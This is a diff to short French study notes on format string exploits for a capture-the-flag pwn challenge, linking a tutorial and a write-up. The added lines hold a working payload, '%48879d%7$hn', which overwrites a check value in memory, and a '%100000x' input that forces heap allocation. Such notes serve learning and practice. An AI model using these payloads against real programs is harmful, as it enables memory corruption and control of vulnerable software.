@@ -1,6 +1,9 @@
 # Documentation 
 
-https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+
+- https://github.com/4nuit/Writeup/tree/master/2024/HTB_CyberApocalypse/pwn/pwn_delulu
+
 
 ## Lire en mémoire 
 
@@ -48,6 +51,23 @@ Try to deceive it by changing your ID.
 
 - obtenir l'addresse du check: **ici le code est bien fait: var40=&var38 est stockée juste après donc le $n=7**
 
+Ainsi pour modifier les lows bytes du check `babe` en `beef`:
+
+```bash
+rax2 0xbeef
+48879
+```
+
+```c
+%48879d%7$hn
+
+### Call free / malloc
+
+print 2**16-1
+
+```
+%100000x
+```
 
 ### Exploit
 
